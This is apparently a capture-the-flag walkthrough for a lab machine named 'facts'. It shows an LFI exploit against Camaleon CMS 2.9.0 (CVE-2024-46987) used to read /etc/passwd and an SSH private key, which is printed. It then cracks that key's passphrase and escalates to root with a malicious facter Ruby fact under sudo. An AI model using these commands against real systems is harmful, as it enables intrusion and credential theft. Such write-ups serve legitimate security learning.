# facts

## Recon

```
Nmap scan report for facts.htb (10.129.23.14)
Host is up (0.25s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: facts
54321/tcp open  http    Golang net/http server
|_http-server-header: MinIO
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 1890A078302B9139
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 03 Feb 2026 03:58:11 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>1890A078302B9139</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 1890A073E8135C5A
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 03 Feb 2026 03:57:53 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>1890A073E8135C5A</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Tue, 03 Feb 2026 03:57:53 GMT
|_    Content-Length: 0
|_http-title: Site doesn't have a title (application/xml).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.98%I=7%D=2/3%Time=6981723A%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nAcc
SF:ept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20appl
SF:ication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max-ag
SF:e=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x20d
SF:d9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX-Am
SF:z-Request-Id:\x201890A073E8135C5A\r\nX-Content-Type-Options:\x20nosniff
SF:\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Tue,\x2003\x20Feb
SF:\x202026\x2003:57:53\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20encodi
SF:ng=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\x20
SF:Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><Requ
SF:estId>1890A073E8135C5A</RequestId><HostId>dd9025bab4ad464b049177c95eb6e
SF:bf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions,59
SF:,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Tue,\x2003\x20F
SF:eb\x202026\x2003:57:53\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPR
SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clos
SF:e\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1\.0\x20
SF:400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20
SF:303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nStrict-T
SF:ransport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nVary:\x
SF:20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9
SF:251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x201890A078302B9139\r\nX-Cont
SF:ent-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\r
SF:\nDate:\x20Tue,\x2003\x20Feb\x202026\x2003:58:11\x20GMT\r\n\r\n<\?xml\x
SF:20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>InvalidReques
SF:t</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</Message
SF:><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestId>1890A
SF:078302B9139</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd
SF:1af9251148b658df7ac2e3e8</HostId></Error>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   240.17 ms 10.10.14.1
2   240.68 ms facts.htb (10.129.23.14)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.20 seconds
```
- We found 3 openports.
	- 22 ssh 
	- 80 http ngnix 
	- 54321 http MinIO

- On visiting port 80 we can see the domain name facts.htb lets add it to our /etc/hosts file.

```
echo "10.129.23.155 facts.htb" | sudo tee -a /etc/hosts
```
- The site contains some funny facts.
- Directory enumeration
```
 ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://facts.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 302
________________________________________________

admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2296ms]
admin.cgi               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2308ms]
admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2110ms]
admin.pl                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2106ms]
:: Progress: [4614/4614] :: Job [1/1] :: 15 req/sec :: Duration: [0:04:56] :: Errors: 0 ::
```
- The **/admin** endpoint redirecting to a login page.
- create a account and login.
- The site using **Camaleon CMS version 2.9.0**
- The above version is vlnerable to LFI. [CVE-2024-46987
](https://github.com/Goultarde/CVE-2024-46987.git) the link contians a poc python script.
- The LFI located in the download_private_file method of the MediaController.
- This vulnerability allows an authenticated user to download arbitrary files from the server by manipulating the file parameter.

```
python3 CVE-2024-46987.py -u http://facts.htb -l peter -p  peter@123 -v /etc/passwd
[*] Récupération du token sur http://facts.htb/admin/login
[*] Authentification réussie.
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```
- In case if you want to do it manuallly on the browser.
```
http://facts.htb/admin/media/download_private_file?file=../../../../etc/passwd
```

- From the passwd files we can see 3 users
```
cat passwd.txt | grep bash

root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```
## Initial Foothold
- lets see can we aaccess any files in their home directory
- I try to access /home/trivia/.ssh/id_rsa but it is 500 means file not exists . i asked cahtgpt for common ssh private key file names and tried one by one.
```
id_rsa
id_dsa
id_ecdsa
id_ed25519
id_xmss
```
- Found a private key fot the user trivia
```
 python3 CVE-2024-46987.py -u http://facts.htb -l peter -p  peter@123 -v /home/trivia/.ssh/id_ed25519
[*] Récupération du token sur http://facts.htb/admin/login
[*] Authentification réussie.
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAWe02oG8
mw+bVq7NBkhoeEAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIC5Lc634UmQ3Yw8Z
HCmiljBXU+2Vkvi6ONzujlDzaB9BAAAAoIsp5KUPhc8SrHmu3cIIwGQIzKqdmQaNckOUz8
oepvZgQLFoRbVafRe7m9PA5RIR0Rj3V+MGE2TmO9qZSmE3MJ6p2L90Uc2yuuukLSgRMwej
Z1lcWsQqveUUK7xoFwBg1ywA1jrRutFPX9R+lb5UtOiHdbc++bwMrfxHB16cXozA1uRuqO
35wFpkin9wBCJw0Kro5vwQB3WPE4u+X2XBayg=
-----END OPENSSH PRIVATE KEY-----
```

- Lets save the private key to id_rsa . and extract hash using ssh2john.
```
ssh2john id_rsa > hash.txt
```
- Crach the hash using john or hashcat.
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_rsa)     
1g 0:00:00:50 DONE (2026-02-03 17:43) 0.01989g/s 63.65p/s 63.65c/s 63.65C/s adriano..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
- Now we have the password for the ssh private key **dragonballz** .  
- lets login to ssh as trivia.

```
chmod 600 id_rsa

ssh -i id_rsa trivia@facts.htb
```
- We got the shell. we are trivia now :).

## user.txt

- In the home directory of user william has the user.txt file 
**User.txt:6bde0ddc805e065d24c703e2045b33de**

## prvivilage esclaiton 

```
sudo -l 
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```
- the user trivia can run **/usr/bin/facter** as root without password. 
- ***Facter is a lightweight, cross-platform system profiling tool used to gather detailed information (facts) about a Linux system—such as IP addresses, OS version, hardware specs, and uptime***

- Well facter is seems harmless but it is if it runs with elevated privilages. it has a ability to execute ruby scripts. 
- Found this on [gtfobins](https://gtfobins.org/gtfobins/facter/).
- Write a malisious ruby script and execute it with facter as root.
- Well the tool loads facts, which are written in ruby.  so i write a malisious fact that pwn a /bin/bash
```
echo 'Facter.add("pwn") { setcode { system("/bin/bash") } }' > /tmp/pwn.rb

sudo /usr/bin/facter --custom-dir=/tmp pwn
root@facts:/home/trivia# 
```
- We got root shell.

**root.txt:7e1a343c0f7e3d497c90d6cfc8fbc29d**
 

